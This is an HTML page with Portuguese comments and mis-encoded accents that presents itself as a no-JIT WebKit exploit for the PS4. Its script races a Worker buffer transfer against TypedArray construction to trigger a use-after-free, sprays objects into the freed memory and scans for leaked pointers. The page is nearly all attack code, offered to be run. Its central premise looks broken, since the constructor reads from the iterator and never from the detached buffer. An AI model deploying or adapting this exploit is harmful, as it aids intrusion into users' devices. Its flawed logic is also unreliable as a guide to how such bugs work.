<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 No-JIT Exploit (Worker Race)</title>
    
</head>
<body>
    <h2>WEBKIT ADDR_OF (WORKER DETACH)</h2>
    <p>Estrat√©gia: Logic Bug (C++) sem JIT. Uso de Thread Worker para UAF.</p>
    
    <button onclick="startExploit()">INICIAR EXPLOIT (Worker Race)</button>
    <div id="console">Log do Sistema...</div>

    <script>
        const logDiv = document.getElementById('console');
        function log(msg, type = '') {
            logDiv.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        const _buf = new ArrayBuffer(8);
        const _f64 = new Float64Array(_buf);
        const _u32 = new Uint32Array(_buf);

        function d2h(val) {
            _f64[0] = val;
            let lo = _u32[0].toString(16).padStart(8, '0');
            let hi = _u32[1].toString(16).padStart(8, '0');
            return `0x${hi}${lo}`;
        }

        // Configura√ß√µes
        const UAF_SIZE = 0x4000; // Tamanho do Buffer
        var worker = null;

        // C√≥digo do Worker (inline para facilitar)
        const workerCode = `
            onmessage = function(e) {
                // O Worker recebe o buffer e o transfere para si mesmo
                // Isso causa o "Detach" na thread principal instantaneamente
                // postMessage √© usado para transferir (neuter)
                const ab = e.data;
                postMessage("DETACHED", [ab]);
            };
        `;

        function startExploit() {
            log("Iniciando Worker...");
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            worker = new Worker(URL.createObjectURL(blob));

            worker.onmessage = function(e) {
                // Apenas confirma√ß√£o de que o worker est√° vivo
                if (e.data === "DETACHED") {
                    // Buffer foi morto.
                }
            };

            log("Tentando Race Condition (50x)...");
            
            // Loop de tentativas
            let attempts = 0;
            const maxAttempts = 50;

            function attempt() {
                attempts++;
                if (attempts > maxAttempts) {
                    log("Falha ap√≥s 50 tentativas. Recarregue.");
                    return;
                }

                // 1. Objeto Alvo (Canary)
                let canary = { a: 0x1337, b: 0xDEAD };

                // 2. Buffer Fonte (Source)
                // Criamos um array buffer que ser√° copiado
                let srcBuffer = new ArrayBuffer(UAF_SIZE);
                let srcView = new DataView(srcBuffer);
                // Preenche com marcador seguro
                for(let i=0; i < UAF_SIZE; i+=4) srcView.setUint32(i, 0xAABBCCDD, true);

                // 3. Iterador Malicioso
                // O construtor TypedArray aceita um iter√°vel.
                // Isso nos permite rodar c√≥digo A CADA ELEMENTO copiado.
                let iter = {
                    [Symbol.iterator]() {
                        let i = 0;
                        return {
                            next() {
                                i++;
                                // PONTO CR√çTICO:
                                // No meio da c√≥pia (quando i chega num ponto espec√≠fico),
                                // mandamos o buffer para o Worker.
                                if (i === (UAF_SIZE / 8)) { 
                                    worker.postMessage(srcBuffer, [srcBuffer]);
                                    
                                    // SPRAY IMEDIATO:
                                    // O buffer morreu. O interpretador est√° pausado aqui?
                                    // Tentamos alocar o Canary no lugar do buffer morto.
                                    // Em modo interpretado, isso √†s vezes funciona melhor com arrays simples.
                                    let spray = new Array(100);
                                    for(let k=0; k<100; k++) spray[k] = canary;
                                }
                                
                                // Retorna valor dummy se o buffer ainda existir
                                // Se o buffer sumiu (byteLength 0), retornamos 0x41
                                if (srcBuffer.byteLength === 0) {
                                    return { value: 0x41414141, done: false };
                                }
                                
                                return { value: 0, done: i >= (UAF_SIZE/4) };
                            }
                        };
                    }
                };

                try {
                    // 4. Trigger
                    // new Uint32Array(iter) vai consumir o iterador e criar um array novo.
                    // Se o UAF funcionar, ele vai ler os ponteiros do nosso 'spray' 
                    // achando que est√° lendo o resto do buffer antigo.
                    let res = new Uint32Array(iter);

                    // 5. Scan
                    for(let k=0; k < res.length; k++) {
                        let val = res[k];
                        // Procuramos valores que n√£o sejam 0 e n√£o sejam 0xAABBCCDD
                        // E n√£o sejam nosso dummy 0x41414141
                        if (val !== 0 && val !== 0xAABBCCDD && val !== 0x41414141) {
                             log(`üõë LEAK ENCONTRADO (Uint32)! Index: ${k}`, 'vuln');
                             log(`Valor Hex: 0x${val.toString(16)}`, 'vuln');
                             log("Nota: Como √© Uint32Array, voc√™ tem a metade (Low/High) do ponteiro.", 'vuln');
                             return; // Sucesso
                        }
                    }

                } catch(e) {
                    // Erros de "Detached Buffer" s√£o esperados e bons
                }

                // Tenta novamente r√°pido
                setTimeout(attempt, 50);
            }

            attempt();
        }
    </script>
</body>
</html>
